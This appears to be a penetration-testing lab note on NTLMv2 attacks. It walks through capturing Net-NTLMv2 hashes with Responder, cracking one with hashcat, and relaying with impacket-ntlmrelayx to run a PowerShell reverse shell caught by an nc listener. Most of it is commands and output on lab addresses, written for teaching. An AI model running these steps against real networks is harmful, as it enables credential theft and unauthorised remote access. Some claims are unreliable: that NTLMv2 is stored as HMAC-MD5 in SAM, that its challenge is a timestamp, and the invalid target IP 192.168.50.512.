# NTLMv2

New Technology Network Manager v2 is, you guessed it, the updated (and more widely used) version of NTLM. It is stored as **HMAC-MD5** hash in SAM.

NTLMv2's challenge is a timestamp rather than a randomly generated number (NTLM), the timestamp is hashed with the users password and is sent as the response.

## Cracking Net-NTLMv2

### Responder

Responder includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes.

{% embed url="https://www.kali.org/tools/responder/" %}

### Start Responder

<pre class="language-powershell"><code class="lang-powershell">kali@kali:~$ ip a
...
3: tap0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
    inet <a data-footnote-ref href="#user-content-fn-1">192.168.119.2</a>/24 scope global tap0
       valid_lft forever preferred_lft forever
    inet6 fe80::4011:48ff:fe1b:5518/64 scope link 
       valid_lft forever preferred_lft forever

kali@kali:~$ sudo responder -I tap0 
<strong>                                         __
</strong>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &#x26; MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events... 
</code></pre>

### Request Access to Non-Existent Share

We want to request access to a share that we don't have access to in order to query the authentication protocol. _<mark style="color:red;">**Note**</mark>_: **The IP we're querying is the IP of our Kali machine!**&#x20;

```powershell
C:\Windows\system32>dir \\192.168.119.2\test
dir \\192.168.119.2\test
Access is denied.
```

### Capturing NTLMv2 Hash

```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:
010100000000000000B050CD1777D801B7585DF5719A
CFBA0000000002000800360057004D00520001001E00570049004E002D00340
044004E004800550058004300340054004900430004003400570049004E002D
00340044004E00480055005800430034005400490043002E00360057004D005
2002E004C004F00430041004C0003001400360057004D0052002E004C004F00
430041004C0005001400360057004D0052002E004C004F00430041004C00070
0080000B050CD1777D801060004000200000008003000300000000000000...
```

### Cracking with Hashcat

We'll save the output of reponder and use Hashcat with our wordlist to crack the NTLMv2 hash.

```shell-session
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...

PAUL::FILES01:1f9d4c51f6e...00000000000000:123Password123
...
```



## NTLM Relay Attack

Sometimes we obtain a Net-NTLMv2 hash but cant crack it. **If the hash we obtained is from a local administrator, we can use it to authenticate over SMB** like we do with psexec or wmiexec.

<mark style="color:red;">**IMPORTANT**</mark>: SMB Signing must be disabled to perform a relay attack!

### NTL&#x4D;_&#x72;elayx - Impacket_

_We can use NTLMrelayx from impacket to relay the hash over SMB._

```
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

**--no-http-server** disables the use of HTTP since we'll be using SMB manually.

**192.168.50.512** is the target. (The box we're trying to get access to)\
**powershell -enc JABjAGwAaQBl..** is the command to execute once authenticated. (Reverse shell)

### Start Listener

We will start a listener on our Attack host to catch the incoming response shell.

```
kali@kali$ nc -nvlp 8080
```

### Request Access to Non-Existent Share

Like we do with Responder, we will query our Attack host for a share to catch the Hash.

```
C:\Windows\system32>dir \\192.168.119.2\test
Access is denied.
```

#### Check Back on the NC Listener and you should have a shell! (Assuming your powershell command works)

_<mark style="color:red;">**NOTE:**</mark>_ Here are some resources for building a powershell command to be executed once the Net-NTLMv2 hash is relayed. (By Impacket)

AGAIN FOR RELAYING TO WORK WE MUST HAVE LOCAL ADMIN!&#x20;

{% embed url="https://www.revshells.com/" %}

[^1]: 
